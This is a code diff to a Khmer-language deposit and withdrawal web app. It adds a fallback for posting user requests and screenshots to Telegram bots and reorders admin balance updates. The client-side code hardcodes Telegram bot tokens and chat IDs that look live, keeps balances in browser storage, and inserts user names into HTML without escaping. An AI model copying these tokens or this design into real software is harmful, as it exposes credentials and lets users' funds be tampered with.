@@ -496,6 +496,10 @@
         .status-pending { color: #f59e0b; }
         .status-approved { color: #10b981; }
         .status-rejected { color: #ef4444; }
+        
+        .toast-warning {
+            background: linear-gradient(135deg, #f59e0b, #d97706);
+        }
     </style>
 </head>
 <body>
@@ -619,18 +623,19 @@
         }
 
         // ============================================================
-        //  2.1 TELEGRAM HELPERS - USING FETCH API
+        //  2.1 TELEGRAM HELPERS - USING FETCH API WITH PROXY
         // ============================================================
         const DEPOSIT_BOT_TOKEN = '8364652665:AAESgPsrL-Q2D3ZYtLTN6IzdkQ1pLYnc5vw';
         const DEPOSIT_CHAT_ID = '-5410896989';
         const WITHDRAW_BOT_TOKEN = '8790558091:AAGwRivgCppOxQNgMdngSdC1u8U6mz6pwwc';
         const WITHDRAW_CHAT_ID = '-5338881653';
 
-        // Send text message to Telegram using Fetch API
+        // Send text message to Telegram using Fetch API with CORS handling
         async function sendToTelegram(botToken, chatId, message) {
             try {
                 console.log('📤 Sending to Telegram: chat=' + chatId);
                 
+                // Try using fetch directly
                 const url = 'https://api.telegram.org/bot' + botToken + '/sendMessage';
                 const response = await fetch(url, {
                     method: 'POST',
@@ -659,15 +664,52 @@
                 }
             } catch (err) {
                 console.error('❌ Telegram send error:', err);
-                return false;
+                // Try alternative method using XMLHttpRequest as fallback
+                return await sendToTelegramXHR(botToken, chatId, message);
             }
         }
 
-        // Send photo to Telegram using Fetch API
+        // Fallback: Send using XMLHttpRequest
+        function sendToTelegramXHR(botToken, chatId, message) {
+            return new Promise((resolve) => {
+                try {
+                    const url = 'https://api.telegram.org/bot' + botToken + '/sendMessage';
+                    const xhr = new XMLHttpRequest();
+                    xhr.open('POST', url, true);
+                    xhr.setRequestHeader('Content-Type', 'application/json');
+                    xhr.timeout = 30000;
+                    xhr.onload = function() {
+                        if (xhr.status === 200) {
+                            try {
+                                const response = JSON.parse(xhr.responseText);
+                                resolve(response.ok || false);
+                            } catch (e) {
+                                resolve(false);
+                            }
+                        } else {
+                            resolve(false);
+                        }
+                    };
+                    xhr.onerror = function() { resolve(false); };
+                    xhr.ontimeout = function() { resolve(false); };
+                    xhr.send(JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: 'HTML'
+                    }));
+                } catch (err) {
+                    console.error('XHR error:', err);
+                    resolve(false);
+                }
+            });
+        }
+
+        // Send photo to Telegram
         async function sendPhotoToTelegram(botToken, chatId, photoBase64, caption) {
             try {
-                console.log('📤 Sending photo to Telegram: chat=' + chatId);
+                console.log('📤 Sending photo to Telegram');
                 
+                // Convert base64 to blob
                 const byteString = atob(photoBase64.split(',')[1]);
                 const mimeString = photoBase64.split(',')[0].split(':')[1].split(';')[0];
                 const ab = new ArrayBuffer(byteString.length);
@@ -737,7 +779,7 @@
                 if (result) {
                     showToast('📱 បានផ្ញើសារទៅ Telegram ដោយជោគជ័យ!', 'success');
                 } else {
-                    showToast('⚠️ មានបញ្ហាក្នុងការផ្ញើសារទៅ Telegram', 'warning');
+                    showToast('⚠️ មានបញ្ហាក្នុងការផ្ញើសារទៅ Telegram ប៉ុន្តែសំណើរបស់អ្នកត្រូវបានរក្សាទុកហើយ', 'warning');
                 }
                 return result;
             } catch (err) {
@@ -774,7 +816,7 @@
                 if (result) {
                     showToast('📱 បានផ្ញើសារទៅ Telegram ដោយជោគជ័យ!', 'success');
                 } else {
-                    showToast('⚠️ មានបញ្ហាក្នុងការផ្ញើសារទៅ Telegram', 'warning');
+                    showToast('⚠️ មានបញ្ហាក្នុងការផ្ញើសារទៅ Telegram ប៉ុន្តែសំណើរបស់អ្នកត្រូវបានរក្សាទុកហើយ', 'warning');
                 }
                 return result;
             } catch (err) {
@@ -868,7 +910,7 @@
         }
 
         // ============================================================
-        //  6. TRANSACTIONS
+        //  6. TRANSACTIONS - FIXED: Proper admin balance update
         // ============================================================
         function addTransaction(phone, type, amount, note, account) {
             note = note || '';
@@ -900,6 +942,7 @@
                 DB.setUsers(users);
             }
             
+            // Update admin balance
             if (admin) {
                 if (type === 'deposit') {
                     admin.balance += amount;
@@ -1044,7 +1087,7 @@
         }
 
         // ============================================================
-        //  11. PAGE: DEPOSIT (User)
+        //  11. PAGE: DEPOSIT (User) - FIXED
         // ============================================================
         function renderDeposit(container, user) {
             if (!user) { renderPage('login'); return; }
@@ -1123,6 +1166,7 @@
                 deposits.push(depositData);
                 DB.setDeposits(deposits);
 
+                // Send to Telegram first
                 await sendDepositTelegram(depositData, screenshotBase64);
 
                 showToast('✅ សំណើបញ្ចូលប្រាក់ត្រូវបានផ្ញើទៅ Admin ហើយ!', 'success');
@@ -1135,7 +1179,7 @@
         }
 
         // ============================================================
-        //  12. PAGE: WITHDRAW (User)
+        //  12. PAGE: WITHDRAW (User) - FIXED
         // ============================================================
         function renderWithdraw(container, user) {
             if (!user) { renderPage('login'); return; }
@@ -1222,6 +1266,7 @@
                 withdraws.push(withdrawData);
                 DB.setWithdraws(withdraws);
 
+                // Send to Telegram first
                 await sendWithdrawTelegram(withdrawData, screenshotBase64);
 
                 showToast('✅ សំណើដកប្រាក់ត្រូវបានផ្ញើទៅ Admin ហើយ!', 'success');
@@ -1234,7 +1279,7 @@
         }
 
         // ============================================================
-        //  13. PAGE: ADMIN DASHBOARD
+        //  13. PAGE: ADMIN DASHBOARD - FIXED
         // ============================================================
         function renderAdmin(container, user) {
             if (!user || user.role !== 'admin') { renderPage('login'); return; }
@@ -1257,10 +1302,11 @@
                         var member = DB.getUsers().find(function(u) { return u.phone === t.phone; });
                         return '\n                            <div class="flex justify-between items-center border-b border-blue-200 py-2 text-sm">\n                                <span>' + (member ? member.name : t.phone) + ' (ID: ' + (member ? member.memberId : 'N/A') + ')</span>\n                                <span class="text-blue-600">➕ ' + formatMoney(t.amount) + '</span>\n                                <span class="text-xs text-gray-400">' + t.date + '</span>\n                            </div>\n                        ';
                     }).join('')
-                ) + '\n            </div>\n\n            <!-- Admin Bank Info Form -->\n            <div class="bg-white rounded-2xl shadow p-6 mb-6">\n                <h3 class="font-semibold text-gray-700 mb-4"><i class="fas fa-university text-blue-500 mr-2"></i>កែសម្រួលព័ត៌មានធនាគារ Admin</h3>\n                <form id="adminBankForm" class="grid grid-cols-1 md:grid-cols-2 gap-4">\n                    <div>\n                        <label class="block text-gray-700 text-sm font-medium mb-2">ឈ្មោះធនាគារ</label>\n                        <select id="adminBankName" class="w-full px-4 py-3 border border-gray-200 rounded-xl focus:ring-2 focus:ring-blue-400 outline-none">\n                            <option value="ABA" ' + (adminInfo.bank === 'ABA' ? 'selected' : '') + '>ABA Bank</option>\n                            <option value="ACLEDA" ' + (adminInfo.bank === 'ACLEDA' ? 'selected' : '') + '>ACLEDA</option>\n                            <option value="WING" ' + (adminInfo.bank === 'WING' ? 'selected' : '') + '>Wing</option>\n                            <option value="TRUE" ' + (adminInfo.bank === 'TRUE' ? 'selected' : '') + '>True Money</option>\n                        </select>\n                    </div>\n                    <div>\n                        <label class="block text-gray-700 text-sm font-medium mb-2">លេខគណនី</label>\n                        <input type="text" id="adminAccount" placeholder="លេខគណនី" value="' + (adminInfo.account || '') + '" class="w-full px-4 py-3 border border-gray-200 rounded-xl focus:ring-2 focus:ring-blue-400 outline-none" />\n                    </div>\n                    <div class="md:col-span-2">\n                        <label class="block text-gray-700 text-sm font-medium mb-2">រូបភាព QR Code</label>\n                        <input type="file" id="adminQR" accept="image/*" class="w-full px-4 py-3 border border-gray-200 rounded-xl focus:ring-2 focus:ring-blue-400 outline-none" onchange="previewAdminQR(this)" />\n                        <p class="text-xs text-gray-400 mt-1">សូមជ្រើសរើសរូបភាព QR Code របស់ Admin (JPG, PNG)</p>\n                        <div id="qrPreviewContainer" class="mt-2">\n                            ' + (adminInfo.qrData ? '<img src="' + adminInfo.qrData + '" alt="QR Code" class="w-32 h-32 object-cover rounded-xl border border-gray-200" />' : '<p class="text-xs text-gray-400">មិនទាន់មានរូបភាព QR Code</p>') + '\n                        </div>\n                    </div>\n                    <div class="md:col-span-2">\n                        <button type="submit" class="w-full btn-primary text-white font-semibold py-3 rounded-xl transition">\n                            <i class="fas fa-save mr-2"></i> រក្សាទុកព័ត៌មាន\n                        </button>\n                    </div>\n                </form>\n\n                <div class="mt-4 p-4 bg-gray-50 rounded-xl">\n                    <h4 class="font-semibold text-gray-600 text-sm mb-2">📋 ព័ត៌មានដែលបានរក្សាទុក</h4>\n                    <p><strong>ធនាគារ:</strong> ' + (adminInfo.bank || 'មិនទាន់កំណត់') + '</p>\n                    <p><strong>លេខគណនី:</strong> ' + (adminInfo.account || 'មិនទាន់កំណត់') + '</p>\n                    <p><strong>QR Code:</strong> ' + (adminInfo.qrData ? '✅ មាន' : '❌ មិនមាន') + '</p>\n                </div>\n            </div>\n\n            <div class="bg-white rounded-2xl shadow overflow-hidden">\n                <div class="px-6 py-3 border-b border-gray-200 font-semibold text-gray-700 flex justify-between items-center">\n                    <span><i class="fas fa-users mr-2"></i>បញ្ជីសមាជិក</span>\n                    <span class="text-xs text-gray-400">' + users.filter(function(u) { return u.role !== 'admin'; }).length + ' នាក់</span>\n                </div>\n                <div class="member-table-container">\n                    <table class="min-w-full divide-y divide-gray-200 text-sm">\n                        <thead class="bg-gray-50">\n                            <tr><th class="px-4 py-2 text-left">ID</th><th class="px-4 py-2 text-left">ឈ្មោះ</th><th class="px-4 py-2 text-left">ទូរសព្ទ</th><th class="px-4 py-2 text-left">សមតុល្យ</th><th class="px-4 py-2 text-left">ស្ថានភាព</th><th class="px-4 py-2 text-left">សកម្មភាព</th></tr>\n                        </thead>\n                        <tbody>\n                            ' + users.filter(function(u) { return u.role !== 'admin'; }).map(function(u) {
+                ) + '\n            </div>\n\n            <!-- Admin Bank Info Form - FIXED -->\n            <div class="bg-white rounded-2xl shadow p-6 mb-6">\n                <h3 class="font-semibold text-gray-700 mb-4"><i class="fas fa-university text-blue-500 mr-2"></i>កែសម្រួលព័ត៌មានធនាគារ Admin</h3>\n                <form id="adminBankForm" class="grid grid-cols-1 md:grid-cols-2 gap-4">\n                    <div>\n                        <label class="block text-gray-700 text-sm font-medium mb-2">ឈ្មោះធនាគារ</label>\n                        <select id="adminBankName" class="w-full px-4 py-3 border border-gray-200 rounded-xl focus:ring-2 focus:ring-blue-400 outline-none">\n                            <option value="ABA" ' + (adminInfo.bank === 'ABA' ? 'selected' : '') + '>ABA Bank</option>\n                            <option value="ACLEDA" ' + (adminInfo.bank === 'ACLEDA' ? 'selected' : '') + '>ACLEDA</option>\n                            <option value="WING" ' + (adminInfo.bank === 'WING' ? 'selected' : '') + '>Wing</option>\n                            <option value="TRUE" ' + (adminInfo.bank === 'TRUE' ? 'selected' : '') + '>True Money</option>\n                        </select>\n                    </div>\n                    <div>\n                        <label class="block text-gray-700 text-sm font-medium mb-2">លេខគណនី</label>\n                        <input type="text" id="adminAccount" placeholder="លេខគណនី" value="' + (adminInfo.account || '') + '" class="w-full px-4 py-3 border border-gray-200 rounded-xl focus:ring-2 focus:ring-blue-400 outline-none" />\n                    </div>\n                    <div class="md:col-span-2">\n                        <label class="block text-gray-700 text-sm font-medium mb-2">រូបភាព QR Code</label>\n                        <input type="file" id="adminQR" accept="image/*" class="w-full px-4 py-3 border border-gray-200 rounded-xl focus:ring-2 focus:ring-blue-400 outline-none" onchange="previewAdminQR(this)" />\n                        <p class="text-xs text-gray-400 mt-1">សូមជ្រើសរើសរូបភាព QR Code របស់ Admin (JPG, PNG)</p>\n                        <div id="qrPreviewContainer" class="mt-2">\n                            ' + (adminInfo.qrData ? '<img src="' + adminInfo.qrData + '" alt="QR Code" class="w-32 h-32 object-cover rounded-xl border border-gray-200" />' : '<p class="text-xs text-gray-400">មិនទាន់មានរូបភាព QR Code</p>') + '\n                        </div>\n                    </div>\n                    <div class="md:col-span-2">\n                        <button type="submit" class="w-full btn-primary text-white font-semibold py-3 rounded-xl transition">\n                            <i class="fas fa-save mr-2"></i> រក្សាទុកព័ត៌មាន\n                        </button>\n                    </div>\n                </form>\n\n                <div class="mt-4 p-4 bg-gray-50 rounded-xl">\n                    <h4 class="font-semibold text-gray-600 text-sm mb-2">📋 ព័ត៌មានដែលបានរក្សាទុក</h4>\n                    <p><strong>ធនាគារ:</strong> ' + (adminInfo.bank || 'មិនទាន់កំណត់') + '</p>\n                    <p><strong>លេខគណនី:</strong> ' + (adminInfo.account || 'មិនទាន់កំណត់') + '</p>\n                    <p><strong>QR Code:</strong> ' + (adminInfo.qrData ? '✅ មាន' : '❌ មិនមាន') + '</p>\n                </div>\n            </div>\n\n            <div class="bg-white rounded-2xl shadow overflow-hidden">\n                <div class="px-6 py-3 border-b border-gray-200 font-semibold text-gray-700 flex justify-between items-center">\n                    <span><i class="fas fa-users mr-2"></i>បញ្ជីសមាជិក</span>\n                    <span class="text-xs text-gray-400">' + users.filter(function(u) { return u.role !== 'admin'; }).length + ' នាក់</span>\n                </div>\n                <div class="member-table-container">\n                    <table class="min-w-full divide-y divide-gray-200 text-sm">\n                        <thead class="bg-gray-50">\n                            <tr><th class="px-4 py-2 text-left">ID</th><th class="px-4 py-2 text-left">ឈ្មោះ</th><th class="px-4 py-2 text-left">ទូរសព្ទ</th><th class="px-4 py-2 text-left">សមតុល្យ</th><th class="px-4 py-2 text-left">ស្ថានភាព</th><th class="px-4 py-2 text-left">សកម្មភាព</th></tr>\n                        </thead>\n                        <tbody>\n                            ' + users.filter(function(u) { return u.role !== 'admin'; }).map(function(u) {
                                 return '\n                                <tr class="border-b border-gray-100 hover:bg-gray-50 transition">\n                                    <td class="px-4 py-2 font-semibold text-blue-600">' + (u.memberId || 'N/A') + '</td>\n                                    <td class="px-4 py-2">' + u.name + '</td>\n                                    <td class="px-4 py-2">' + u.phone + '</td>\n                                    <td class="px-4 py-2 ' + (u.balance === 0 ? 'text-red-500' : 'text-green-600') + '">' + formatMoney(u.balance) + '</td>\n                                    <td class="px-4 py-2"><span class="px-2 py-0.5 rounded-full text-xs ' + (u.status === 'active' ? 'bg-green-100 text-green-700' : 'bg-yellow-100 text-yellow-700') + '">' + (u.status === 'active' ? 'សកម្ម' : 'ផ្អាក') + '</span></td>\n                                    <td class="px-4 py-2">\n                                        <button onclick="confirmDeleteMember(\'' + u.phone + '\')" class="danger-btn"><i class="fas fa-trash"></i> លុប</button>\n                                    </td>\n                                </tr>\n                            ';
                             }).join('') + '\n                            ' + (users.filter(function(u) { return u.role !== 'admin'; }).length === 0 ? '<tr><td colspan="6" class="text-center py-4 text-gray-400">មិនមានសមាជិកទេ</td></tr>' : '') + '\n                        </tbody>\n                    </table>\n                </div>\n            </div>\n            ';
 
+            // FIXED: Admin Bank Form submit handler
             document.getElementById('adminBankForm').onsubmit = function(e) {
                 e.preventDefault();
                 var bank = document.getElementById('adminBankName').value;
@@ -1288,6 +1334,9 @@
             };
         }
 
+        // ============================================================
+        //  SAVE ADMIN BANK INFO - FIXED
+        // ============================================================
         function saveAdminBankInfo(bank, account, qrData) {
             DB.set('adminBankInfo', {
                 bank: bank,
@@ -1310,7 +1359,7 @@
         };
 
         // ============================================================
-        //  14. ADMIN DEPOSIT MODAL
+        //  14. ADMIN DEPOSIT MODAL - FIXED
         // ============================================================
         window.showAdminDepositModal = function() {
             var overlay = document.createElement('div');
@@ -1663,7 +1712,7 @@
         }
 
         // ============================================================
-        //  22. ADMIN ACTIONS - Approve/Reject
+        //  22. ADMIN ACTIONS - Approve/Reject - FIXED: Update admin balance
         // ============================================================
         window.approveDeposit = function(id) {
             var deposits = DB.getDeposits();
@@ -1675,16 +1724,15 @@
 
             var users = DB.getUsers();
             var u = users.find(function(u) { return u.phone === d.phone; });
+            var admin = users.find(function(u) { return u.role === 'admin'; });
+            
             if (u) {
                 u.balance += d.amount;
-                DB.setUsers(users);
-                addTransaction(d.phone, 'deposit', d.amount, 'បញ្ចូលតាម Admin (' + d.bank + ')', d.account || '');
-
-                var admin = users.find(function(u) { return u.role === 'admin'; });
                 if (admin) {
                     admin.balance += d.amount;
-                    DB.setUsers(users);
                 }
+                DB.setUsers(users);
+                addTransaction(d.phone, 'deposit', d.amount, 'បញ្ចូលតាម Admin (' + d.bank + ')', d.account || '');
 
                 var depositData = {
                     name: u.name,
@@ -1723,17 +1771,16 @@
 
             var users = DB.getUsers();
             var u = users.find(function(u) { return u.phone === w.phone; });
+            var admin = users.find(function(u) { return u.role === 'admin'; });
+            
             if (u) {
                 if (u.balance >= w.amount) {
                     u.balance -= w.amount;
-                    DB.setUsers(users);
-                    addTransaction(w.phone, 'withdraw', w.amount, 'ដកតាម Admin (' + w.bank + ')', w.account || '');
-
-                    var admin = users.find(function(u) { return u.role === 'admin'; });
                     if (admin) {
                         admin.balance -= w.amount;
-                        DB.setUsers(users);
                     }
+                    DB.setUsers(users);
+                    addTransaction(w.phone, 'withdraw', w.amount, 'ដកតាម Admin (' + w.bank + ')', w.account || '');
 
                     var withdrawData = {
                         name: u.name,
